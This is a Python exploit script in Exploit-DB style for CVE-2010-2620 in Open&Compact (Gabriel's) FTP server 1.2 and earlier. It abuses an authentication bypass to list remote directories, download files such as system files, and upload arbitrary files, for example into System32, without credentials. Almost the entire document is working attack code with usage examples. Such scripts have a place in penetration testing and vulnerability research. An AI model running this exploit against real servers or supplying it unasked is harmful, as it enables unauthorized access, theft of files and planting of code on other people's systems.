#!/usr/bin/python
# Exploit Title:  Abusing authentication bypass of Open&Compact (Gabriel's) 
#                 FTP server to traverse directories and download/upload files
# Date:           Jun 27, 2015
# Exploit Author: Oleg Mitrofanov - http://www.github.com/reider-roque
#                 Based on Serge Gorbunov's (http://www.exploit-db.com/exploits/13932/)
#                 and Wireghoul (https://www.exploit-db.com/exploits/27401/) exploits
# Software Link:  http://sourceforge.net/projects/open-ftpd/
# Version:        <= 1.2
# Tested on:      Windows 7, Windows 2003 Server, Windows XP SP3
# CVE:            2010-2620
 
 
import ftplib
import os
import os.path
import socket
import sys
 

def usage():
    print("""Open&Compact (Gabriel's) FTP Server <= 1.2 Auth Bypass Exploit.
CVE: 2010-2620                         Author: Oleg Mitrofanov

Usage: {0} IP CMD CMD_ARGS

  IP                IPv4 address of the host running Gabriel's FTP

Commands and their args:
  list PATH         List remote PATH contents
  get REMOTE_FILE [LOCAL_FILE]
                    Download a remote file optionally providing a
                    name for it
  put REMOTE_FILE LOCAL_FILE
                    Upload a local file to a remote file

Examples:
  python {0} 1.1.1.1 list "C:\\Windows"
  python {0} 1.1.1.1 get "C:\\boot.ini"
  python {0} 1.1.1.1 get "C:\\boot.ini" "remote_boot.ini"
  python {0} 1.1.1.1 put "C:\\Windows\\System32\\myapp" "myapp"
""".format(sys.argv[0]))
    sys.exit(0)

arg_length = len(sys.argv)

if not (4 <= arg_length <= 5):
    usage()

action = sys.argv[2].lower()

l_file = l_dir = ""

if action == "list" and arg_length == 4:
    r_dir = os.path.normpath(sys.argv[3])
elif action == "get" or (action == "put" and arg_length == 5):
    r_full_path = os.path.normpath(sys.argv[3])
    r_full_path_comps = r_full_path.split("\\")
    r_dir = "\\".join(r_full_path_comps[:-1])
    r_file = r_full_path_comps[len(r_full_path_comps)-1]
    
    if action == "put":
        if arg_length != 5: usage()
        if not os.path.isfile(sys.argv[4]):
            print("Error: {} file not found".format(sys.argv[4]))
            sys.exit(1)
        
    # Check is only effective for get command; put will always pass it
    if arg_length == 5:
        l_full_path = os.path.normpath(sys.argv[4])
        l_full_path = l_full_path.replace("/", "\\")
        l_full_path_comps = l_full_path.split("\\")
        l_dir = "\\".join(l_full_path_comps[:-1])
        l_file = l_full_path_comps[len(l_full_path_comps)-1]

    l_file = r_file if l_file == "" else l_file
    l_dir = "." if l_dir == "" else l_dir
    os.chdir(l_dir)
else:
    usage()

ip = sys.argv[1]
r_dir = r_dir.replace("\\", "\\\\")

# Connect to server
try:
    ftp = ftplib.FTP(ip)
except socket.error as e:
    print("Error: " + str(e))    
    sys.exit(1)

ftp.set_pasv(False)

def execftpcmd(func, *args):
    try:
        print(func(*args))
    except ftplib.error_perm as e:
        print "Error: " + e.args[0]
        return False
    return True 

# We need no authentication at all
if not execftpcmd(ftp.sendcmd, 'CWD ' + r_dir):
    sys.exit(1)

if action == "list" and not execftpcmd(ftp.retrlines, 'LIST'):
        sys.exit(1)
elif action == "get":
    if not execftpcmd(ftp.retrbinary, 'RETR ' + r_file, open(l_file, 'wb').write):
        os.remove(l_file)
        sys.exit(1)
elif action == "put":
    if not execftpcmd(ftp.storbinary, 'STOR ' + r_file, open(l_file, 'r')):
        sys.exit(1)

ftp.quit()
